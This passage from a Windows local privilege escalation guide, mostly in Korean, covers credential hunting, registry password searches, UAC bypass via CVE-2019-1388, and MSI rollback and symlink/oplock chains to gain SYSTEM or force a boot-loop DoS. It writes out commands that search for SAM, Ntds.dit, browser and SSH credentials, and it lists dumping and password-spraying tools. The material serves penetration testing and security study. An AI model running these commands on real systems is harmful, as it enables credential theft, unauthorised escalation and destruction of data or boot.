anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
파일을 모두 검색하세요:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### RecycleBin의 Credentials

Bin도 확인해서 그 안에 있는 credentials를 찾아보세요

여러 프로그램에 의해 저장된 **passwords를 recover**하려면 다음을 사용할 수 있습니다: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### registry 내부

**credentials가 있을 수 있는 다른 registry keys**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**레지스트리에서 openssh keys 추출.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### 브라우저 히스토리

**Chrome 또는 Firefox**에 저장된 passwords가 있는 db를 확인해야 합니다.\
또한 브라우저의 history, bookmarks, favourites도 확인해서, 거기에 **passwords are** 저장되어 있는지 볼 수 있습니다.

브라우저에서 passwords를 추출하는 Tools:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)**은 Windows operating system에 내장된 technology로, 서로 다른 언어의 software components 간 **intercommunication**을 가능하게 합니다. 각 COM component는 **class ID (CLSID)**로 **identified via**되며, 각 component는 하나 이상의 interface를 통해 기능을 노출하고, 이 interface는 interface IDs (IIDs)로 식별됩니다.

COM classes와 interfaces는 registry에서 각각 **HKEY\CLASSES\ROOT\CLSID**와 **HKEY\CLASSES\ROOT\Interface** 아래에 정의됩니다. 이 registry는 **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.** 를 병합하여 생성됩니다.

이 registry의 CLSIDs 안에서 child registry인 **InProcServer32**를 찾을 수 있으며, 여기에는 **DLL**을 가리키는 **default value**와 **ThreadingModel**이라는 value가 있습니다. 이 value는 **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi), 또는 **Neutral** (Thread Neutral)일 수 있습니다.

![](<../../images/image (729).png>)

기본적으로, 실행될 **DLLs** 중 임의의 것을 **overwrite**할 수 있다면, 그 DLL이 다른 user에 의해 실행될 경우 **privileges**를 **escalate**할 수 있습니다.

공격자가 persistence mechanism으로 COM Hijacking을 어떻게 사용하는지 알아보려면 다음을 확인하세요:


{{#ref}}
com-hijacking.md
{{#endref}}

### **파일과 registry에서 Generic Password search**

**Search for file contents**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**특정 파일 이름으로 파일 검색**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**레지스트리에서 키 이름과 비밀번호 검색**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### 비밀번호를 찾는 도구들

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** plugin 제가 만든 이 플러그인은 피해자 내부에서 **credentials를 찾는 모든 metasploit POST module을 자동으로 실행**합니다.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) 이 페이지에 언급된 비밀번호가 포함된 모든 파일을 자동으로 찾습니다.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) 는 시스템에서 비밀번호를 추출하는 또 다른 훌륭한 도구입니다.

도구 [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) 는 평문으로 이 데이터를 저장하는 여러 도구(PuTTY, WinSCP, FileZilla, SuperPuTTY, 그리고 RDP)의 **sessions**, **usernames** 및 **passwords**를 찾습니다.
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Imagine that **a process running as SYSTEM open a new process** (`OpenProcess()`) **with full access**. The same process **also create a new process** (`CreateProcess()`) **with low privileges but inheriting all the open handles of the main process**.\
Then, if you have **full access to the low privileged process**, you can grab the **open handle to the privileged process created** with `OpenProcess()` and **inject a shellcode**.\
[Read this example for more information about **how to detect and exploit this vulnerability**.](leaked-handle-exploitation.md)\
[Read this **other post for a more complete explanation on how to test and abuse more open handlers of processes and threads inherited with different levels of permissions (not only full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Shared memory segments, referred to as **pipes**, enable process communication and data transfer.

Windows provides a feature called **Named Pipes**, allowing unrelated processes to share data, even over different networks. This resembles a client/server architecture, with roles defined as **named pipe server** and **named pipe client**.

When data is sent through a pipe by a **client**, the **server** that set up the pipe has the ability to **take on the identity** of the **client**, assuming it has the necessary **SeImpersonate** rights. Identifying a **privileged process** that communicates via a pipe you can mimic provides an opportunity to **gain higher privileges** by adopting the identity of that process once it interacts with the pipe you established. For instructions on executing such an attack, helpful guides can be found [**here**](named-pipe-client-impersonation.md) and [**here**](#from-high-integrity-to-system).

Also the following tool allows to **intercept a named pipe communication with a tool like burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **and this tool allows to list and see all the pipes to find privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

The Telephony service (TapiSrv) in server mode exposes `\\pipe\\tapsrv` (MS-TRP). A remote authenticated client can abuse the mailslot-based async event path to turn `ClientAttach` into an arbitrary **4-byte write** to any existing file writable by `NETWORK SERVICE`, then gain Telephony admin rights and load an arbitrary DLL as the service. Full flow:

- `ClientAttach` with `pszDomainUser` set to a writable existing path → the service opens it via `CreateFileW(..., OPEN_EXISTING)` and uses it for async event writes.
- Each event writes the attacker-controlled `InitContext` from `Initialize` to that handle. Register a line app with `LRegisterRequestRecipient` (`Req_Func 61`), trigger `TRequestMakeCall` (`Req_Func 121`), fetch via `GetAsyncEvents` (`Req_Func 0`), then unregister/shutdown to repeat deterministic writes.
- Add yourself to `[TapiAdministrators]` in `C:\Windows\TAPI\tsec.ini`, reconnect, then call `GetUIDllName` with an arbitrary DLL path to execute `TSPI_providerUIIdentify` as `NETWORK SERVICE`.

More details:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### File Extensions that could execute stuff in Windows

Check out the page **[https://filesec.io/](https://filesec.io/)**

### Protocol handler / ShellExecute abuse via Markdown renderers

Clickable Markdown links forwarded to `ShellExecuteExW` can trigger dangerous URI handlers (`file:`, `ms-appinstaller:` or any registered scheme) and execute attacker-controlled files as the current user. See:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Monitoring Command Lines for passwords**

When getting a shell as a user, there may be scheduled tasks or other processes being executed which **pass credentials on the command line**. The script below captures process command lines every two seconds and compares the current state with the previous state, outputting any differences.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## 프로세스에서 비밀번호 탈취하기

## Low Priv User에서 NT\AUTHORITY SYSTEM으로 (CVE-2019-1388) / UAC Bypass

그래픽 인터페이스에 접근할 수 있고(콘솔 또는 RDP를 통해) UAC가 활성화되어 있다면, Microsoft Windows의 일부 버전에서는 권한이 없는 사용자로부터 터미널이나 "NT\AUTHORITY SYSTEM"과 같은 다른 프로세스를 실행할 수 있다.

이로 인해 동일한 취약점으로 권한 상승과 UAC 우회를 동시에 할 수 있다. 또한 아무것도 설치할 필요가 없으며, 이 과정에서 사용되는 바이너리는 Microsoft가 서명하고 배포한 것이다.

영향을 받는 시스템 중 일부는 다음과 같다:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
이 취약점을 exploit하려면, 다음 단계를 수행해야 합니다:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
## Administrator Medium에서 High Integrity Level로 / UAC Bypass

Integrity Levels에 대해 **학습하려면 이것을 읽으세요**:


{{#ref}}
integrity-levels.md
{{#endref}}

그다음 **UAC와 UAC bypass에 대해 배우려면 이것을 읽으세요:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Arbitrary Folder Delete/Move/Rename에서 SYSTEM EoP로

[**이 블로그 पोस्ट**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)에서 설명된 technique과 [**여기에서 제공되는**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs) exploit code.

이 attack은 기본적으로 Windows Installer의 rollback feature를 악용해서 uninstallation 과정 중 legitimate files를 malicious ones로 교체하는 방식이다. 이를 위해 attacker는 `C:\Config.Msi` 폴더를 hijack하는 데 사용될 **malicious MSI installer**를 만들어야 하며, 이후 Windows Installer가 다른 MSI packages의 uninstallation 중 rollback files를 저장할 때 이 폴더를 사용하게 된다. 그 rollback files는 malicious payload를 포함하도록 수정된다.

요약한 technique은 다음과 같다:

1. **Stage 1 – Hijack 준비 (`C:\Config.Msi`를 비워 두기)**

- Step 1: MSI 설치
- harmless file(예: `dummy.txt`)을 writable folder(`TARGETDIR`)에 설치하는 `.msi`를 만든다.
- installer를 **"UAC Compliant"**로 표시해서 **non-admin user**도 실행할 수 있게 한다.
- 설치 후 파일에 대한 **handle**을 열린 상태로 유지한다.

- Step 2: Uninstall 시작
- 같은 `.msi`를 uninstall한다.
- uninstall process는 파일을 `C:\Config.Msi`로 옮기고 `.rbf` files(rollback backups)로 이름을 바꾸기 시작한다.
- **GetFinalPathNameByHandle**로 열린 file handle을 **poll**해서 파일이 `C:\Config.Msi\<random>.rbf`가 되는 시점을 감지한다.

- Step 3: Custom Syncing
- `.msi`에는 **custom uninstall action (`SyncOnRbfWritten`)**이 포함되어 있으며:
- `.rbf`가 written되었을 때 신호를 보낸다.
- 그런 다음 uninstall을 계속하기 전에 다른 event를 **wait**한다.

- Step 4: `.rbf` 삭제 차단
- 신호를 받으면, `.rbf` file을 `FILE_SHARE_DELETE` 없이 **open**한다 — 이렇게 하면 파일이 삭제되지 못한다.
- 그런 다음 uninstall이 끝날 수 있도록 다시 **signal**한다.
- Windows Installer는 `.rbf`를 삭제하지 못하고, 모든 내용을 삭제할 수 없기 때문에 **`C:\Config.Msi`가 제거되지 않는다**.

- Step 5: `.rbf`를 수동으로 삭제
- attacker인 당신이 `.rbf` file을 수동으로 삭제한다.
- 이제 **`C:\Config.Msi`가 비어 있으므로**, hijack할 준비가 되었다.

> 이 시점에서 **SYSTEM-level arbitrary folder delete vulnerability**를 트리거하여 `C:\Config.Msi`를 삭제한다.

2. **Stage 2 – Rollback Scripts를 Malicious ones로 교체**

- Step 6: Weak ACLs로 `C:\Config.Msi` 재생성
- `C:\Config.Msi` folder를 직접 다시 만든다.
- **weak DACLs**(예: Everyone:F)를 설정하고, `WRITE_DAC`가 있는 handle을 열린 상태로 유지한다.

- Step 7: 또 다른 Install 실행
- `.msi`를 다시 설치하되:
- `TARGETDIR`: Writable location.
- `ERROROUT`: forced failure를 발생시키는 variable.
- 이 install은 rollback을 다시 트리거하는 데 사용되며, `.rbs`와 `.rbf`를 읽는다.

- Step 8: `.rbs` 감시
- `ReadDirectoryChangesW`를 사용해 `C:\Config.Msi`를 모니터링하다가 새로운 `.rbs`가 나타날 때까지 기다린다.
- filename을 캡처한다.

- Step 9: Rollback 전 Sync
- `.msi`에는 **custom install action (`SyncBeforeRollback`)**이 포함되어 있으며:
- `.rbs`가 생성되면 event를 signal한다.
- 그런 다음 계속하기 전에 **wait**한다.

- Step 10: Weak ACL 재적용
- `.rbs created` event를 받은 후:
- Windows Installer가 `C:\Config.Msi`에 **strong ACLs**를 다시 적용한다.
- 하지만 여전히 `WRITE_DAC`를 가진 handle이 있으므로, **weak ACLs**를 다시 적용할 수 있다.

> ACLs는 **handle open 시에만 enforce**되므로, 여전히 folder에 쓸 수 있다.

- Step 11: Fake `.rbs`와 `.rbf` 넣기
- `.rbs` file을 Windows에 다음을 지시하는 **fake rollback script**로 덮어쓴다:
- your `.rbf` file(malicious DLL)을 **privileged location**(예: `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`)으로 복원하라고 한다.
- **malicious SYSTEM-level payload DLL**을 담은 fake `.rbf`를 넣는다.

- Step 12: Rollback 트리거
- sync event를 signal해서 installer가 다시 진행되게 한다.
- **type 19 custom action (`ErrorOut`)**이 known point에서 install을 **의도적으로 실패**하도록 구성되어 있다.
- 이로 인해 **rollback이 시작**된다.

- Step 13: SYSTEM이 DLL 설치
- Windows Installer는:
- malicious `.rbs`를 읽는다.
- `.rbf` DLL을 target location으로 복사한다.
- 이제 **SYSTEM-loaded path**에 malicious DLL이 있게 된다.

- 마지막 단계: SYSTEM Code 실행
- hijack한 DLL을 로드하는 trusted **auto-elevated binary**(예: `osk.exe`)를 실행한다.
- **Boom**: 코드가 **SYSTEM**으로 실행된다.


### Arbitrary File Delete/Move/Rename에서 SYSTEM EoP로

main MSI rollback technique(이전 것)는 `C:\Config.Msi` 같은 **전체 folder**를 삭제할 수 있다고 가정한다. 하지만 vulnerability가 **arbitrary file deletion**만 허용한다면 어떨까?

**NTFS internals**를 악용할 수 있다: 모든 folder에는 다음과 같은 hidden alternate data stream이 있다:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
이 stream은 폴더의 **index metadata**를 저장합니다.

따라서 폴더의 **`::$INDEX_ALLOCATION` stream**을 **delete**하면, NTFS는 filesystem에서 **전체 폴더**를 제거합니다.

다음과 같은 standard file deletion APIs를 사용해 이를 수행할 수 있습니다:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> 비록 *file* delete API를 호출하고 있지만, 실제로는 **폴더 자체를 삭제**합니다.

### Folder Contents Delete에서 SYSTEM EoP로
당신의 primitive가 임의의 파일/폴더를 삭제하는 것은 허용하지 않지만, **공격자가 제어하는 폴더의 *내용* 삭제는 허용**한다면?

1. Step 1: 미끼 폴더와 파일 설정
- Create: `C:\temp\folder1`
- 그 안에: `C:\temp\folder1\file1.txt`

2. Step 2: `file1.txt`에 **oplock** 배치
- privileged process가 `file1.txt`를 삭제하려고 할 때, oplock은 실행을 **일시 중지**합니다.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Step 3: SYSTEM process 트리거 (예: `SilentCleanup`)
- 이 프로세스는 폴더들(예: `%TEMP%`)을 스캔하고 그 내용물을 삭제하려고 시도합니다.
- `file1.txt`에 도달하면, **oplock가 트리거**되고 제어가 callback으로 넘어갑니다.

4. Step 4: oplock callback 내부에서 – 삭제를 리다이렉트

- Option A: `file1.txt`를 다른 곳으로 이동
- 이렇게 하면 oplock를 깨지 않고 `folder1`이 비워집니다.
- `file1.txt`를 직접 삭제하지 마세요 — 그러면 oplock가 너무 일찍 해제됩니다.

- Option B: `folder1`을 **junction**으로 변환:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Option C: `\RPC Control`에 **symlink**를 생성:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> This targets the NTFS internal stream that stores folder metadata — deleting it deletes the folder.

5. Step 5: Release the oplock
- SYSTEM process continues and tries to delete `file1.txt`.
- But now, due to the junction + symlink, it's actually deleting:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Result**: `C:\Config.Msi`는 SYSTEM에 의해 삭제됩니다.

### Arbitrary Folder Create에서 Permanent DoS로

**파일을 쓸 수 없거나** **약한 권한을 설정할 수 없더라도**, **SYSTEM/admin으로 임의의 폴더를 생성할 수 있게 해주는** primitive를 악용합니다.

**중요한 Windows driver**의 이름으로 **폴더**(파일이 아님)를 생성합니다. 예:
```
C:\Windows\System32\cng.sys
```
- 이 경로는 보통 `cng.sys` 커널 모드 드라이버에 해당한다.
- 이를 **폴더로 미리 생성**하면, Windows는 부팅 시 실제 드라이버를 로드하는 데 실패한다.
- 그러면 Windows는 부팅 중 `cng.sys`를 로드하려고 시도한다.
- 폴더를 발견하고, **실제 드라이버를 resolve하지 못해**, **크래시하거나 부팅을 중단**한다.
- **fallback이 없고**, 외부 개입(예: boot repair 또는 disk access) 없이는 **복구도 불가능**하다.

### privileged log/backup paths + OM symlinks를 arbitrary file overwrite / boot DoS로 이어가기

**privileged service**가 **writable config**에서 읽은 경로로 log/export를 작성할 때, 그 경로를 **Object Manager symlinks + NTFS mount points**로 redirect하면 privileged write를 arbitrary overwrite로 바꿀 수 있다(**SeCreateSymbolicLinkPrivilege** 없이도 가능).

**Requirements**
- target path를 저장하는 config가 attacker가 쓸 수 있어야 한다(예: `%ProgramData%\...\.ini`).
- `\RPC Control`로 가는 mount point와 OM file symlink를 만들 수 있어야 한다(James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).
- 해당 경로에 쓰는 privileged operation이 있어야 한다(log, export, report).

**Example chain**
1. config를 읽어 privileged log destination을 확인한다. 예: `C:\ProgramData\ICONICS\IcoSetup64.ini`의 `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt`.
2. admin 없이 경로를 redirect:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. 권한이 있는 구성 요소가 로그를 쓰도록 기다립니다(예: admin이 "send test SMS"를 트리거). 이제 쓰기는 `C:\Windows\System32\cng.sys`에 들어갑니다.
4. 덮어쓴 대상(hex/PE parser)을 검사해 손상을 확인합니다; 재부팅하면 Windows가 변조된 드라이버 경로를 로드하게 되어 → **boot loop DoS**. 이는 권한이 있는 서비스가 write로 열게 되는 모든 보호된 파일에도 일반화됩니다.

> `cng.sys`는 보통 `C:\Windows\System32\drivers\cng.sys`에서 로드되지만, `C:\Windows\System32\cng.sys`에 복사본이 있으면 먼저 시도될 수 있어, 손상된 데이터를 위한 신뢰할 수 있는 DoS sink가 됩니다.



## **From High Integrity to System**

### **New service**

이미 High Integrity process에서 실행 중이라면, **SYSTEM으로 가는 경로**는 새 service를 **생성하고 실행하는 것**만으로도 쉬울 수 있습니다:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> service binary를 만들 때, 유효한 service인지 확인하거나, 그렇지 않다면 binary가 필요한 작업을 너무 느리기 전에 수행하도록 해야 합니다. 그렇지 않으면 20s 안에 kill됩니다.

### AlwaysInstallElevated

High Integrity process에서 **AlwaysInstallElevated registry entries를 enable**하고 _**.msi**_ wrapper를 사용해 reverse shell을 **install**해 볼 수 있습니다.\
[관련 registry keys와 _.msi_ package 설치 방법에 대한 자세한 정보는 여기](#alwaysinstallelevated)에서 확인하세요.

### High + SeImpersonate privilege to System

**코드는 여기에서** [**확인할 수 있습니다**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

해당 token privileges가 있다면(아마 이미 High Integrity process에서 찾게 될 것입니다), SeDebug privilege로 **거의 모든 process**(protected processes는 제외)를 **open**할 수 있고, process의 **token을 copy**한 뒤, 그 token으로 **arbitrary process**를 만들 수 있습니다.\
이 technique에서는 보통 **SYSTEM으로 실행 중이며 모든 token privileges를 가진 process를 선택**합니다. (_yes, SYSTEM processes 중에서도 모든 token privileges가 없는 경우가 있습니다_).\
**이 technique를 실행하는 code 예시는 여기에서** [**확인할 수 있습니다**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

이 technique은 meterpreter가 `getsystem`에서 privilege escalation을 할 때 사용합니다. 이 technique은 **pipe를 만들고, 그 pipe에 write하도록 service를 create/abuse하는 것**으로 구성됩니다. 그런 다음 **`SeImpersonate`** privilege를 사용해 pipe를 만든 **server**는 pipe client(service)의 **token을 impersonate**할 수 있게 되어 SYSTEM privileges를 얻습니다.\
[**name pipes에 대해 더 알아보려면 이것을 읽어보세요**](#named-pipe-client-impersonation).\
[**name pipes를 사용해 high integrity에서 System으로 가는 예제를 보려면 이것을 읽어보세요**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

**SYSTEM**으로 실행되는 **process**가 **load**하는 **dll을 hijack**할 수 있다면, 그 permissions으로 arbitrary code를 실행할 수 있습니다. 따라서 Dll Hijacking은 이런 종류의 privilege escalation에도 유용하며, 게다가 dll을 load하는 folder에 대한 **write permissions**를 가지므로 **high integrity process에서 훨씬 쉽게 달성**할 수 있습니다.\
**Dll hijacking에 대해 더 알아보려면 여기에서** [**확인할 수 있습니다**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Read:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Windows local privilege escalation vectors를 찾는 가장 좋은 tool:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- misconfigurations와 sensitive files를 확인합니다 (**[**여기에서 확인**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detected.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- 일부 가능한 misconfigurations를 확인하고 정보를 수집합니다 (**[**여기에서 확인**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- misconfigurations를 확인합니다**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY, WinSCP, SuperPuTTY, FileZilla, 그리고 RDP 저장된 session 정보를 추출합니다. local에서 -Thorough를 사용하세요.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager에서 crendentials를 추출합니다. Detected.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- 수집한 passwords를 domain 전체에 spray합니다**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh는 PowerShell ADIDNS/LLMNR/mDNS spoofer 및 man-in-the-middle tool입니다.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- 기본 privesc Windows enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- 알려진 privesc vulnerabilities를 검색합니다 (DEPRECATED for Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Local checks **(Need Admin rights)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- 알려진 privesc vulnerabilities를 검색합니다 (VisualStudio로 compile해야 함) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- misconfigurations를 찾기 위해 host를 enumeration합니다 (privesc보다 info 수집 tool에 더 가깝습니다) (compile 필요) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- 많은 software에서 credentials를 추출합니다 (github에 precompiled exe 있음)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp의 C# 포트**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- misconfiguration을 확인합니다 (github에 precompiled executable 있음). 권장하지 않습니다. Win10에서 잘 작동하지 않습니다.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- 가능한 misconfigurations를 확인합니다 (python에서 exe). 권장하지 않습니다. Win10에서 잘 작동하지 않습니다.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- 이 post를 기반으로 만든 tool입니다 (정상 동작에 accesschk가 필요하지 않지만 사용할 수는 있습니다).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** 출력 결과를 읽고 동작하는 exploit을 추천합니다 (local python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** 출력 결과를 읽고 동작하는 exploit을 추천합니다 (local python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

프로젝트는 올바른 버전의 .NET을 사용해 compile해야 합니다([여기 참고](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). 피해자 host에 설치된 .NET 버전을 확인하려면 다음을 실행하면 됩니다:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## References

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
